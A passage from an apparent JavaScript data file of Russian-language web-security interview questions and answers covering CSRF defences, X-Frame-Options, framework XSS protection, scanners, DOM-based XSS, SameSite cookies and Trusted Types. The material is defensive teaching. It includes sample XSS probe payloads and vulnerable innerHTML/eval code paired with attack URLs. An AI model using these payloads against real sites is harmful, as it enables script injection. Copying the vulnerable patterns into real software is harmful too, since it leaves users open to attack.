потерям</li><li>Компрометация аккаунтов</li><li>Публикация вредоносного контента</li></ul><p><strong>Факторы снижающие риск:</strong></p><ul><li>Same-Origin Policy — нельзя читать ответ</li><li>CORS — контролирует cross-origin запросы</li><li>SameSite cookies — современная защита</li><li>Preflight для сложных запросов</li></ul><p><strong>Отличие от XSS:</strong></p><ul><li>XSS выполняет код в контексте жертвы</li><li>CSRF заставляет выполнить действие</li><li>XSS может украсть данные</li><li>CSRF только изменяет состояние</li><li>XSS требует уязвимость в приложении</li><li>CSRF работает с любым приложением без защиты</li></ul>",
    difficulty: 'junior',
    tags: ['CSRF', 'атаки', 'механизм', 'cookies', 'безопасность']
  },

  {
    id: 51,
    question: "Какие методы защиты от CSRF существуют и как они работают?",
    answer: "<p><strong>Защита от CSRF</strong> требует проверки что запрос исходит от легитимного источника.</p><p><strong>1. CSRF Tokens (основной метод):</strong></p><p><strong>Как работает:</strong></p><ul><li>Сервер генерирует уникальный токен для каждой сессии/формы</li><li>Токен вставляется в HTML форму как скрытое поле</li><li>При отправке формы токен проверяется</li><li>Злонамеренный сайт не может получить токен (Same-Origin Policy)</li></ul><p><strong>Реализация:</strong></p><ul><li>Server генерирует: csrfToken = randomString()</li><li>HTML: &lt;input type=\"hidden\" name=\"_csrf\" value=\"token123\"&gt;</li><li>Server проверяет: if (req.body._csrf !== session.csrfToken) reject()</li></ul><p><strong>Преимущества:</strong></p><ul><li>Эффективная защита</li><li>Работает для любых запросов</li><li>Широко поддерживается фреймворками</li></ul><p><strong>2. SameSite Cookie атрибут (современный метод):</strong></p><p><strong>Как работает:</strong></p><ul><li>Браузер не отправляет cookie в cross-site запросах</li><li>Set-Cookie: sessionId=abc; SameSite=Lax</li><li>Автоматическая защита на уровне браузера</li></ul><p><strong>Режимы SameSite:</strong></p><ul><li>Strict — максимальная защита, но хуже UX</li><li>Lax — баланс, защищает POST/PUT/DELETE</li><li>None — без защиты (требует Secure)</li></ul><p><strong>Преимущества:</strong></p><ul><li>Простота — один атрибут</li><li>Не требует изменений в коде</li><li>Защита из коробки</li></ul><p><strong>Недостатки:</strong></p><ul><li>Не все браузеры поддерживают</li><li>Нужен fallback для старых браузеров</li></ul><p><strong>3. Double Submit Cookie:</strong></p><p><strong>Как работает:</strong></p><ul><li>Токен хранится И в cookie, И в форме/заголовке</li><li>Server сравнивает оба значения</li><li>Злонамеренный сайт не может установить cookie для другого домена</li></ul><p><strong>Пример:</strong></p><ul><li>Cookie: csrfToken=abc123</li><li>Header: X-CSRF-Token: abc123</li><li>Server проверяет совпадение</li></ul><p><strong>4. Проверка Origin/Referer заголовков:</strong></p><p><strong>Как работает:</strong></p><ul><li>Origin заголовок содержит источник запроса</li><li>Server проверяет что Origin = ожидаемый домен</li><li>Referer как fallback (менее надежен)</li></ul><p><strong>Реализация:</strong></p><ul><li>const origin = req.headers.origin;</li><li>if (origin !== 'https://trusted-site.com') reject();</li></ul><p><strong>Недостатки:</strong></p><ul><li>Origin может отсутствовать</li><li>Referer может быть отключен пользователем</li><li>Дополнительный слой, не основная защита</li></ul><p><strong>5. Custom Headers для AJAX:</strong></p><p><strong>Как работает:</strong></p><ul><li>Обычные HTML формы не могут устанавливать кастомные заголовки</li><li>Только JavaScript с same-origin может</li><li>Наличие кастомного заголовка = легитимный запрос</li></ul><p><strong>Пример:</strong></p><ul><li>fetch('/api', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })</li><li>Server проверяет наличие заголовка</li></ul><p><strong>6. Re-authentication для критичных операций:</strong></p><ul><li>Запрос пароля перед важными действиями</li><li>Подтверждение по email/SMS</li><li>2FA для чувствительных операций</li></ul><p><strong>Комплексная защита (рекомендуется):</strong></p><ul><li>✅ SameSite=Lax для всех cookies</li><li>✅ CSRF токены для форм</li><li>✅ Проверка Origin для дополнительной защиты</li><li>✅ Custom headers для AJAX API</li><li>✅ Re-auth для критичных операций</li></ul><p><strong>Best practices:</strong></p><ul><li>✅ Используйте POST/PUT/DELETE для изменяющих операций</li><li>✅ GET запросы должны быть идемпотентными</li><li>✅ Не полагайтесь только на cookies</li><li>✅ Генерируйте криптографически стойкие токены</li><li>✅ Токены должны быть уникальны для каждой сессии</li><li>✅ Проверяйте токены на сервере ВСЕГДА</li></ul>",
    difficulty: 'middle',
    tags: ['CSRF', 'защита', 'токены', 'SameSite', 'безопасность']
  },

  {
    id: 52,
    question: "Что такое X-Frame-Options и как он помогает в безопасности?",
    answer: "<p><strong>X-Frame-Options</strong> — это HTTP заголовок, контролирующий может ли страница отображаться в iframe.</p><p><strong>Зачем нужен X-Frame-Options:</strong></p><ul><li>Защита от Clickjacking атак</li><li>Предотвращение встраивания вашего сайта в iframe</li><li>Контроль над тем, кто может фреймировать контент</li></ul><p><strong>Что такое Clickjacking:</strong></p><ol><li>Злонамеренный сайт встраивает ваш сайт в невидимый iframe</li><li>Накладывает свой контент поверх</li><li>Пользователь думает что кликает на кнопку evil.com</li><li>На самом деле кликает на банк.com в iframe</li><li>Выполняется нежелательное действие</li></ol><p><strong>Значения X-Frame-Options:</strong></p><p><strong>DENY:</strong></p><ul><li>X-Frame-Options: DENY</li><li>Страница не может быть во фрейме НИКОГДА</li><li>Даже на том же домене</li><li>Максимальная защита</li></ul><p><strong>SAMEORIGIN:</strong></p><ul><li>X-Frame-Options: SAMEORIGIN</li><li>Только страницы с того же origin могут фреймировать</li><li>Позволяет внутреннее использование iframe</li><li>Блокирует сторонние сайты</li></ul><p><strong>ALLOW-FROM uri (устарело):</strong></p><ul><li>X-Frame-Options: ALLOW-FROM https://trusted.com</li><li>Разрешить конкретному домену</li><li>❌ Не поддерживается большинством браузеров</li><li>Не рекомендуется использовать</li></ul><p><strong>Как это защищает:</strong></p><ul><li>Браузер проверяет заголовок</li><li>Если политика нарушена — не отображает фрейм</li><li>Показывает пустой фрейм или ошибку</li><li>Злонамеренный сайт не может встроить контент</li></ul><p><strong>Примеры атак которые предотвращает:</strong></p><p><strong>Clickjacking на банк:</strong></p><ul><li>evil.com встраивает bank.com/transfer</li><li>Накладывает кнопку \"Скачать бесплатно\"</li><li>Пользователь кликает думая что скачивает</li><li>На самом деле переводит деньги</li><li>X-Frame-Options блокирует встраивание</li></ul><p><strong>Кража лайков/подписок:</strong></p><ul><li>Социальная сеть во фрейме</li><li>Невидимая кнопка \"Подписаться\"</li><li>Пользователь думает что кликает на что-то другое</li><li>Подписывается на спам-аккаунт</li></ul><p><strong>Современная альтернатива — CSP frame-ancestors:</strong></p><p><strong>Content-Security-Policy:</strong></p><ul><li>Content-Security-Policy: frame-ancestors 'none'</li><li>Эквивалент X-Frame-Options: DENY</li><li>frame-ancestors 'self' — эквивалент SAMEORIGIN</li><li>frame-ancestors https://trusted.com — разрешить домен</li></ul><p><strong>Преимущества CSP frame-ancestors:</strong></p><ul><li>Более гибкий — можно указать несколько доменов</li><li>Лучше поддерживается</li><li>Часть общей CSP политики</li></ul><p><strong>Использовать оба заголовка:</strong></p><ul><li>X-Frame-Options для старых браузеров</li><li>CSP frame-ancestors для новых</li><li>Defense in depth</li></ul><p><strong>Когда НЕ использовать:</strong></p><ul><li>Сайты которые должны встраиваться (виджеты, OAuth)</li><li>Платежные формы которые используются в iframe</li><li>Встраиваемый контент как YouTube</li></ul><p><strong>Для таких случаев:</strong></p><ul><li>Использовать ALLOW-FROM (CSP) для конкретных партнеров</li><li>Или вообще не устанавливать заголовок</li><li>Но применить другие меры безопасности</li></ul><p><strong>Best practices:</strong></p><ul><li>✅ По умолчанию: X-Frame-Options: DENY</li><li>✅ Для внутренних iframe: SAMEORIGIN</li><li>✅ Добавить CSP frame-ancestors тоже</li><li>✅ Тестировать что легитимные iframe работают</li><li>✅ Применять на всех страницах</li></ul>",
    difficulty: 'middle',
    tags: ['X-Frame-Options', 'Clickjacking', 'безопасность', 'iframe', 'заголовки']
  },

  {
    id: 53,
    question: "Как работает защита от XSS во фреймворках (React, Vue, Angular)?",
    answer: "<p><strong>Современные фреймворки</strong> имеют встроенную защиту от XSS, но её нужно правильно использовать.</p><p><strong>React:</strong></p><p><strong>Автоматическое экранирование в JSX:</strong></p><ul><li>Все значения в {} автоматически экранируются</li><li>const name = '&lt;script&gt;alert()&lt;/script&gt;';</li><li>&lt;div&gt;{name}&lt;/div&gt; — безопасно, отобразится как текст</li><li>React преобразует в HTML entities</li></ul><p><strong>Опасность dangerouslySetInnerHTML:</strong></p><ul><li>❌ &lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;</li><li>Полностью отключает защиту</li><li>Позволяет внедрить HTML и скрипты</li><li>Использовать только для доверенного контента</li></ul><p><strong>Безопасная альтернатива:</strong></p><ul><li>Использовать библиотеку DOMPurify</li><li>const clean = DOMPurify.sanitize(userInput);</li><li>&lt;div dangerouslySetInnerHTML={{__html: clean}} /&gt;</li></ul><p><strong>Безопасность атрибутов:</strong></p><ul><li>❌ &lt;div className={userInput}&gt; — может быть опасно</li><li>❌ &lt;a href={userInput}&gt; — javascript: URLs опасны</li><li>✅ Валидировать URL перед использованием</li></ul><p><strong>Vue:</strong></p><p><strong>Автоматическое экранирование в шаблонах:</strong></p><ul><li>{{ userInput }} — автоматически экранируется</li><li>Vue преобразует HTML в безопасный текст</li><li>Защита по умолчанию</li></ul><p><strong>v-html директива (опасно):</strong></p><ul><li>❌ &lt;div v-html=\"userInput\"&gt;&lt;/div&gt;</li><li>Рендерит HTML без экранирования</li><li>Уязвимо к XSS если userInput от пользователя</li><li>Только для доверенного контента</li></ul><p><strong>Безопасные практики Vue:</strong></p><ul><li>✅ Использовать {{ }} для текста</li><li>✅ v-text для текстового контента</li><li>✅ Санитизация перед v-html</li></ul><p><strong>Динамические атрибуты:</strong></p><ul><li>:href=\"userUrl\" — нужна валидация</li><li>Проверять на javascript: протокол</li></ul><p><strong>Angular:</strong></p><p><strong>Встроенный DomSanitizer:</strong></p><ul><li>Angular автоматически санитизирует значения</li><li>{{ userInput }} — безопасно</li><li>[innerHTML]=\"userInput\" — автоматически очищается</li></ul><p><strong>Контексты санитизации:</strong></p><ul><li>HTML — для innerHTML</li><li>Style — для [style]</li><li>URL — для [src], [href]</li><li>Resource URL — для &lt;script&gt;, &lt;iframe&gt;</li></ul><p><strong>Bypass санитизации (осторожно!):</strong></p><ul><li>this.sanitizer.bypassSecurityTrustHtml(value)</li><li>❌ Отключает защиту</li><li>Только для проверенного контента</li></ul><p><strong>Общие правила для всех фреймворков:</strong></p><p><strong>1. Доверяйте встроенной защите:</strong></p><ul><li>✅ Используйте стандартные способы вывода</li><li>✅ Не отключайте санитизацию без причины</li></ul><p><strong>2. Rich Text редакторы:</strong></p><ul><li>Используйте whitelist разрешенных тегов</li><li>Библиотеки: DOMPurify, sanitize-html</li><li>Серверная валидация тоже</li></ul><p><strong>3. Атрибуты требуют внимания:</strong></p><ul><li>href, src, style могут быть опасны</li><li>Валидировать URL (не javascript:, не data:)</li><li>Проверять на event handlers (onclick и т.д.)</li></ul><p><strong>4. Server-Side Rendering:</strong></p><ul><li>Те же правила применяются</li><li>Санитизация на сервере</li><li>Не доверять клиентским данным</li></ul><p><strong>Антипаттерны (избегать):</strong></p><ul><li>❌ eval() с пользовательским вводом</li><li>❌ new Function() с пользовательским кодом</li><li>❌ Отключение санитизации \"для удобства\"</li><li>❌ Доверие данным из URL параметров</li></ul><p><strong>Best practices:</strong></p><ul><li>✅ Понимать как работает защита фреймворка</li><li>✅ Не обходить защиту без веской причины</li><li>✅ Использовать DOMPurify для rich text</li><li>✅ Валидировать URLs и атрибуты</li><li>✅ CSP как дополнительный слой</li><li>✅ Code review на опасные паттерны</li></ul>",
    difficulty: 'middle',
    tags: ['XSS', 'защита', 'React', 'Vue', 'Angular', 'фреймворки']
  },

  {
    id: 54,
    question: "Какие инструменты существуют для обнаружения XSS и CSRF уязвимостей?",
    answer: "<p><strong>Инструменты для обнаружения уязвимостей</strong> делятся на автоматические сканеры, ручные инструменты и библиотеки.</p><p><strong>Автоматические сканеры безопасности:</strong></p><p><strong>1. OWASP ZAP (Zed Attack Proxy):</strong></p><ul><li>Бесплатный open-source сканер</li><li>Автоматическое сканирование на XSS, CSRF, SQL injection</li><li>Интерактивный прокси для ручного тестирования</li><li>Fuzzing для поиска уязвимостей</li><li>Интеграция в CI/CD</li></ul><p><strong>Использование:</strong></p><ul><li>Запустить прокси</li><li>Направить браузер через ZAP</li><li>Автоматическое сканирование или ручное тестирование</li><li>Отчет с найденными уязвимостями</li></ul><p><strong>2. Burp Suite:</strong></p><ul><li>Профессиональный инструмент (платная версия)</li><li>Community edition бесплатно</li><li>Интерцептор запросов</li><li>Сканер уязвимостей</li><li>Repeater для модификации запросов</li></ul><p><strong>3. Acunetix:</strong></p><ul><li>Коммерческий сканер</li><li>Автоматическое обнаружение XSS, CSRF</li><li>Deep scan для сложных приложений</li><li>Детальные отчеты</li></ul><p><strong>4. Netsparker:</strong></p><ul><li>Автоматический сканер</li><li>Proof-based сканирование</li><li>Минимум ложных срабатываний</li></ul><p><strong>Инструменты для разработки:</strong></p><p><strong>1. ESLint плагины для безопасности:</strong></p><ul><li>eslint-plugin-security</li><li>eslint-plugin-no-unsanitized</li><li>Обнаруживает опасные паттерны в коде</li><li>Предупреждает о dangerouslySetInnerHTML</li></ul><p><strong>Пример конфигурации:</strong></p><ul><li>rules: { 'no-unsanitized/method': 'error', 'no-unsanitized/property': 'error' }</li></ul><p><strong>2. SonarQube:</strong></p><ul><li>Статический анализ кода</li><li>Обнаружение security hotspots</li><li>Интеграция в CI/CD</li><li>Отчеты по качеству и безопасности</li></ul><p><strong>3. Snyk:</strong></p><ul><li>Сканирование зависимостей</li><li>Обнаружение уязвимостей в библиотеках</li><li>Автоматические PR с фиксами</li></ul><p><strong>Browser DevTools расширения:</strong></p><p><strong>1. XSS Hunter:</strong></p><ul><li>Обнаружение blind XSS</li><li>Callback когда payload сработал</li><li>Полезно для сложных сценариев</li></ul><p><strong>2. CSP Evaluator:</strong></p><ul><li>Проверка Content Security Policy</li><li>Рекомендации по улучшению</li><li>Обнаружение слабых мест в CSP</li></ul><p><strong>Ручное тестирование:</strong></p><p><strong>Payloads для XSS тестирования:</strong></p><ul><li>&lt;script&gt;alert('XSS')&lt;/script&gt;</li><li>&lt;img src=x onerror=alert('XSS')&gt;</li><li>&lt;svg onload=alert('XSS')&gt;</li><li>javascript:alert('XSS')</li></ul><p><strong>Тестирование различных контекстов:</strong></p><ul><li>HTML контекст</li><li>Атрибуты</li><li>JavaScript строки</li><li>CSS</li><li>URL параметры</li></ul><p><strong>CSRF тестирование:</strong></p><ul><li>Удалить CSRF токен и отправить запрос</li><li>Использовать токен из другой сессии</li><li>Проверить работает ли SameSite cookie</li><li>Изменить Origin заголовок</li></ul><p><strong>CI/CD интеграция:</strong></p><p><strong>GitHub Actions пример:</strong></p><ul><li>- uses: zaproxy/action-baseline@v0.4.0</li><li>with: target: https://your-app.com</li><li>Автоматический скан при каждом PR</li></ul><p><strong>Библиотеки для санитизации:</strong></p><p><strong>DOMPurify:</strong></p><ul><li>Очистка HTML от XSS</li><li>const clean = DOMPurify.sanitize(dirty);</li><li>Используется на клиенте</li></ul><p><strong>sanitize-html (Node.js):</strong></p><ul><li>Серверная санитизация</li><li>Whitelist тегов и атрибутов</li></ul><p><strong>Мониторинг в production:</strong></p><p><strong>1. Content Security Policy Reports:</strong></p><ul><li>CSP: report-uri /csp-violations</li><li>Браузер отправляет отчет при блокировке</li><li>Обнаружение атак в реальном времени</li></ul><p><strong>2. Web Application Firewall (WAF):</strong></p><ul><li>Cloudflare WAF</li><li>AWS WAF</li><li>Блокирует известные XSS паттерны</li><li>Логирование подозрительных запросов</li></ul><p><strong>3. Security Monitoring:</strong></p><ul><li>Sentry — отслеживание JS ошибок</li><li>LogRocket — session replay</li><li>Обнаружение аномального поведения</li></ul><p><strong>Best practices тестирования:</strong></p><ul><li>✅ Регулярные автоматические сканы</li><li>✅ Ручное penetration testing</li><li>✅ Code review с фокусом на безопасность</li><li>✅ Интеграция в CI/CD</li><li>✅ Тестирование всех user inputs</li><li>✅ Мониторинг CSP violations</li></ul>",
    difficulty: 'middle',
    tags: ['XSS', 'CSRF', 'инструменты', 'тестирование', 'OWASP ZAP', 'безопасность']
  },

  {
    id: 55,
    question: "Что такое DOM-based XSS и чем он отличается от других типов?",
    answer: "<p><strong>DOM-based XSS</strong> — это тип XSS атаки, где уязвимость находится в клиентском JavaScript коде, а не на сервере.</p><p><strong>Ключевое отличие:</strong></p><ul><li>Вредоносный payload никогда не отправляется на сервер</li><li>Вся атака происходит в браузере</li><li>Уязвимость в коде который манипулирует DOM</li><li>Сервер может быть полностью безопасен</li></ul><p><strong>Как работает DOM-based XSS:</strong></p><ol><li>JavaScript читает данные из ненадежного источника</li><li>Например: URL, location.hash, document.referrer</li><li>Использует эти данные небезопасным способом</li><li>Например: innerHTML, eval(), document.write()</li><li>Вредоносный код выполняется</li></ol><p><strong>Источники ненадежных данных (Sources):</strong></p><ul><li>location.href — весь URL</li><li>location.search — query параметры</li><li>location.hash — fragment после #</li><li>document.referrer — откуда пришел пользователь</li><li>window.name — имя окна</li><li>document.cookie — cookies</li><li>localStorage/sessionStorage</li><li>postMessage данные</li></ul><p><strong>Опасные функции (Sinks):</strong></p><ul><li>element.innerHTML = source</li><li>element.outerHTML = source</li><li>document.write(source)</li><li>eval(source)</li><li>setTimeout(source, time)</li><li>setInterval(source, time)</li><li>new Function(source)</li><li>location = source (если source = 'javascript:...')</li></ul><p><strong>Примеры уязвимостей:</strong></p><p><strong>Пример 1 — location.hash:</strong></p><ul><li>// Уязвимый код</li><li>const name = location.hash.substring(1);</li><li>document.getElementById('welcome').innerHTML = 'Hello ' + name;</li><li>// Атака URL</li><li>site.com#&lt;img src=x onerror=alert()&gt;</li></ul><p><strong>Пример 2 — URL параметры:</strong></p><ul><li>// Уязвимый код</li><li>const urlParams = new URLSearchParams(window.location.search);</li><li>const msg = urlParams.get('message');</li><li>document.write(msg);</li><li>// Атака URL</li><li>site.com?message=&lt;script&gt;steal()&lt;/script&gt;</li></ul><p><strong>Пример 3 — eval():</strong></p><ul><li>// Уязвимый код</li><li>const data = location.hash.substring(1);</li><li>eval('var x = ' + data);</li><li>// Атака URL</li><li>site.com#'; maliciousCode(); '</li></ul><p><strong>Почему DOM-based XSS опасен:</strong></p><ul><li>Обходит серверные фильтры (данные не на сервере)</li><li>WAF не помогает</li><li>Сложнее обнаружить обычными сканерами</li><li>Payload может быть в fragment (#), который не отправляется серверу</li></ul><p><strong>Защита от DOM-based XSS:</strong></p><p><strong>1. Избегать опасных Sinks:</strong></p><ul><li>❌ element.innerHTML = userInput</li><li>✅ element.textContent = userInput</li><li>❌ eval(userInput)</li><li>✅ JSON.parse(userInput) для данных</li></ul><p><strong>2. Санитизация перед использованием:</strong></p><ul><li>const clean = DOMPurify.sanitize(location.hash);</li><li>element.innerHTML = clean;</li></ul><p><strong>3. Валидация данных:</strong></p><ul><li>Проверить что URL параметр содержит ожидаемые значения</li><li>Whitelist разрешенных значений</li><li>Reject неожиданные данные</li></ul><p><strong>4. Безопасные альтернативы:</strong></p><ul><li>createElement() вместо innerHTML</li><li>setAttribute() вместо прямой манипуляции</li><li>textContent вместо innerHTML для текста</li></ul><p><strong>5. Content Security Policy:</strong></p><ul><li>CSP: script-src 'self' 'nonce-...'</li><li>Блокирует eval(), inline событий</li><li>Дополнительный уровень защиты</li></ul><p><strong>Отличия от Stored/Reflected XSS:</strong></p><table><tr><th>Аспект</th><th>DOM-based</th><th>Stored/Reflected</th></tr><tr><td>Уязвимость</td><td>Клиентский JS</td><td>Серверный код</td></tr><tr><td>Payload хранение</td><td>URL, fragment</td><td>БД или URL</td></tr><tr><td>Серверная роль</td><td>Минимальная</td><td>Основная</td></tr><tr><td>WAF защита</td><td>Не помогает</td><td>Может помочь</td></tr><tr><td>Обнаружение</td><td>Сложнее</td><td>Проще</td></tr></table><p><strong>Best practices:</strong></p><ul><li>✅ Аудит клиентского JavaScript кода</li><li>✅ Избегать опасных функций</li><li>✅ Валидировать все source данные</li><li>✅ Использовать безопасные API</li><li>✅ CSP для дополнительной защиты</li><li>✅ Статический анализ кода</li></ul>",
    difficulty: 'senior',
    tags: ['XSS', 'DOM-based XSS', 'клиентская безопасность', 'JavaScript']
  },

  {
    id: 56,
    question: "Как работает защита SameSite для cookies и почему она важна для CSRF?",
    answer: "<p><strong>SameSite</strong> — это атрибут cookie, контролирующий отправку в cross-site запросах.</p><p><strong>Три режима SameSite:</strong></p><p><strong>1. SameSite=Strict (самая строгая защита):</strong></p><p><strong>Поведение:</strong></p><ul><li>Cookie отправляется ТОЛЬКО для same-site запросов</li><li>Same-site = тот же registered domain</li><li>НЕ отправляется даже при клике по ссылке с другого сайта</li></ul><p><strong>Пример:</strong></p><ul><li>Set-Cookie: sessionId=abc; SameSite=Strict</li><li>Пользователь на google.com</li><li>Кликает ссылку на bank.com</li><li>Cookie НЕ отправится при первом запросе</li><li>Пользователь увидит \"не залогинен\"</li></ul><p><strong>Когда использовать:</strong></p><ul><li>Критичные операции (платежи, изменение пароля)</li><li>Административные панели</li><li>Внутренние системы</li></ul><p><strong>2. SameSite=Lax (баланс, по умолчанию):</strong></p><p><strong>Поведение:</strong></p><ul><li>Cookie отправляется для \"безопасной\" top-level navigation</li><li>Top-level = изменяется URL в адресной строке</li><li>Только для GET запросов</li></ul><p><strong>Отправляется:</strong></p><ul><li>✅ Клик по ссылке (GET)</li><li>✅ window.location = \"...\" (GET)</li><li>✅ &lt;form method=\"GET\"&gt;</li></ul><p><strong>НЕ отправляется:</strong></p><ul><li>❌ &lt;form method=\"POST\"&gt; с другого сайта</li><li>❌ fetch/XHR запросы cross-site</li><li>❌ &lt;img src=...&gt; на другом домене</li><li>❌ &lt;iframe&gt; с другого домена</li></ul><p><strong>Пример защиты от CSRF:</strong></p><ul><li>Set-Cookie: sessionId=abc; SameSite=Lax</li><li>evil.com пытается: &lt;form action=\"bank.com/transfer\" method=\"POST\"&gt;</li><li>Cookie НЕ отправится</li><li>Запрос не авторизован</li><li>CSRF атака провалилась</li></ul><p><strong>3. SameSite=None (без защиты):</strong></p><p><strong>Поведение:</strong></p><ul><li>Cookie отправляется ВСЕГДА</li><li>В same-site и cross-site запросах</li><li>Как было до введения SameSite</li></ul><p><strong>Требования:</strong></p><ul><li>ОБЯЗАТЕЛЬНО нужен атрибут Secure</li><li>Set-Cookie: widget=xyz; SameSite=None; Secure</li><li>Только HTTPS</li></ul><p><strong>Когда использовать:</strong></p><ul><li>Встраиваемые виджеты (чаты, комментарии)</li><li>OAuth flows в iframe</li><li>Платежные формы third-party</li><li>Cross-site API с credentials</li></ul><p><strong>Как SameSite защищает от CSRF:</strong></p><p><strong>Традиционная CSRF атака:</strong></p><ol><li>Жертва залогинена на bank.com</li><li>Cookie: sessionId=abc (без SameSite)</li><li>evil.com: &lt;form action=\"bank.com/transfer\" method=\"POST\"&gt;</li><li>Браузер отправляет cookie</li><li>Деньги переведены ✗</li></ol><p><strong>С SameSite=Lax:</strong></p><ol><li>Жертва залогинена на bank.com</li><li>Cookie: sessionId=abc; SameSite=Lax</li><li>evil.com: &lt;form method=\"POST\"&gt;</li><li>Браузер НЕ отправляет cookie (cross-site POST)</li><li>Запрос не авторизован ✓</li></ol><p><strong>Современные браузеры и SameSite:</strong></p><ul><li>Chrome 80+ (2020): SameSite=Lax по умолчанию</li><li>Firefox 69+: SameSite=Lax по умолчанию</li><li>Edge: следует за Chrome</li><li>Safari: свои правила ITP</li></ul><p><strong>Если не указан SameSite:</strong></p><ul><li>Современные браузеры: SameSite=Lax автоматически</li><li>Старые браузеры: нет защиты (как SameSite=None)</li></ul><p><strong>Миграция на SameSite:</strong></p><p><strong>Шаг 1 — Аудит cookies:</strong></p><ul><li>Какие cookies используются</li><li>Нужен ли cross-site доступ</li></ul><p><strong>Шаг 2 — Установить правильные значения:</strong></p><ul><li>Auth cookies: SameSite=Lax</li><li>Критичные: SameSite=Strict</li><li>Виджеты: SameSite=None; Secure</li></ul><p><strong>Шаг 3 — Тестирование:</strong></p><ul><li>Проверить функциональность</li><li>Особенно cross-site сценарии</li></ul><p><strong>Комбинация с другими методами:</strong></p><ul><li>SameSite — первая линия защиты от CSRF</li><li>CSRF токены — дополнительная защита</li><li>Origin проверка — еще один слой</li><li>Defense in depth подход</li></ul><p><strong>Best practices:</strong></p><ul><li>✅ По умолчанию: SameSite=Lax</li><li>✅ Критичные операции: SameSite=Strict</li><li>✅ Cross-site widgets: SameSite=None; Secure</li><li>✅ Всегда тестировать после изменений</li><li>✅ Использовать с CSRF токенами</li></ul>",
    difficulty: 'middle',
    tags: ['SameSite', 'cookies', 'CSRF', 'защита', 'безопасность']
  },

  {
    id: 57,
    question: "Что такое Trusted Types API и как он помогает предотвратить DOM-based XSS?",
    answer: "<p><strong>Trusted Types</strong> — это Web API для предотвращения DOM-based XSS атак путем контроля над опасными операциями с DOM.</p><p><strong>Основная идея:</strong></p><ul><li>Браузер блокирует опасные DOM операции по умолчанию</li><li>Разрешаются только \"trusted\" (доверенные) значения</li><li>Trusted значения создаются через специальные политики</li><li>Принудительная санитизация на уровне браузера</li></ul><p><strong>Проблема которую решает:</strong></p><ul><li>Разработчики забывают санитизировать данные</li><li>Случайное использование небезопасных API</li><li>innerHTML = userInput — часто встречающаяся ошибка</li><li>Trusted Types делает это невозможным</li></ul><p><strong>Как работает:</strong></p><p><strong>Шаг 1 — Включение через CSP:</strong></p><ul><li>Content-Security-Policy: require-trusted-types-for 'script'</li><li>Браузер начинает требовать Trusted Types</li><li>Опасные операции без trusted значений блокируются</li></ul><p><strong>Шаг 2 — Создание политики:</strong></p><ul><li>const policy = trustedTypes.createPolicy('myPolicy', {</li><li>  createHTML: (input) => DOMPurify.sanitize(input),</li><li>  createScriptURL: (input) => { /* валидация */ return input; }</li><li>});</li></ul><p><strong>Шаг 3 — Использование:</strong></p><ul><li>// ❌ Без Trusted Types — заблокировано</li><li>element.innerHTML = userInput; // TypeError!</li><li>// ✅ С Trusted Types — работает</li><li>element.innerHTML = policy.createHTML(userInput);</li></ul><p><strong>Типы Trusted объектов:</strong></p><p><strong>TrustedHTML:</strong></p><ul><li>Для innerHTML, outerHTML, insertAdjacentHTML</li><li>createHTML(input) — метод политики</li></ul><p><strong>TrustedScript:</strong></p><ul><li>Для eval(), setTimeout с кодом, new Function()</li><li>createScript(input) — метод политики</li></ul><p><strong>TrustedScriptURL:</strong></p><ul><li>Для &lt;script src=...&gt;, Worker, import()</li><li>createScriptURL(input) — метод политики</li></ul><p><strong>Опасные Sinks требующие Trusted Types:</strong></p><ul><li>Element.innerHTML</li><li>Element.outerHTML</li><li>Element.insertAdjacentHTML()</li><li>Element.setHTML() (новый API)</li><li>document.write()</li><li>document.writeln()</li><li>eval()</li><li>setTimeout() / setInterval() со строкой</li><li>new Function()</li></ul><p><strong>Пример политики с валидацией:</strong></p><ul><li>const policy = trustedTypes.createPolicy('sanitizer', {</li><li>  createHTML(input) {</li><li>    // Санитизация HTML</li><li>    return DOMPurify.sanitize(input, {</li><li>      ALLOWED_TAGS: ['b', 'i', 'p', 'br'],</li><li>      ALLOWED_ATTR: []</li><li>    });</li><li>  },</li><li>  createScriptURL(input) {</li><li>    // Только разрешенные домены</li><li>    const url = new URL(input, document.baseURI);</li><li>    if (url.origin === 'https://cdn.trusted.com') {</li><li>      return input;</li><li>    }</li><li>    throw new TypeError('Invalid script URL');</li><li>  }</li><li>});</li></ul><p><strong>Default Policy:</strong></p><ul><li>Политика по умолчанию если никакая не указана</li><li>trustedTypes.createPolicy('default', { ... })</li><li>Применяется ко всем операциям</li><li>Полезно для legacy кода</li></ul><p><strong>Enforcement режимы:</strong></p><p><strong>Enforcement (строгий):</strong></p><ul><li>CSP: require-trusted-types-for 'script'</li><li>Блокирует опасные операции</li><li>TypeError при нарушении</li></ul><p><strong>Report-Only:</strong></p><ul><li>CSP: require-trusted-types-for 'script'; report-uri /violations</li><li>Не блокирует, только отчитывает</li><li>Для тестирования перед полным включением</li></ul><p><strong>Преимущества Trusted Types:</strong></p><ul><li>✅ Принудительная защита на уровне платформы</li><li>✅ Невозможно забыть санитизировать</li><li>✅ Централизованная логика безопасности</li><li>✅ Обнаружение уязвимостей при разработке</li><li>✅ Защита от DOM-based XSS</li></ul><p><strong>Миграция на Trusted Types:</strong></p><p><strong>Шаг 1 — Report-Only:</strong></p><ul><li>Включить в режиме отчетов</li><li>Собрать все нарушения</li></ul><p><strong>Шаг 2 — Создать политики:</strong></p><ul><li>Написать sanitization логику</li><li>Покрыть все use cases</li></ul><p><strong>Шаг 3 — Рефакторинг кода:</strong></p><ul><li>Заменить опасные операции на политики</li><li>element.innerHTML = policy.createHTML(data)</li></ul><p><strong>Шаг 4 — Enforcement:</strong></p><ul><li>Включить строгий режим</li><li>Мониторить нарушения</li></ul><p><strong>Поддержка браузеров:</strong></p><ul><li>Chrome 83+</li><li>Edge 83+</li><li>Opera 69+</li><li>Нет в Firefox и Safari (пока)</li></ul><p><strong>Polyfill для других браузеров:</strong></p><ul><li>Существует polyfill</li><li>Эмулирует API для совместимости</li></ul><p><strong>Best practices:</strong></p><ul><li>✅ Начать с Report-Only режима</li><li>✅ Создать строгие политики санитизации</li><li>✅ Использовать DOMPurify в политиках</li><li>✅ Минимизировать количество политик</li><li>✅ Аудит и review политик</li><li>✅ Мониторинг violations</li></ul>",
    difficulty: 'senior',
    tags: ['Trusted Types', 'DOM-based XSS', 'защита', 'Web API', 'CSP']
  },

  {
    id: 58,
    question: "Какие best practices безопасности нужно соблюдать при работе с пользовательским вводом?",
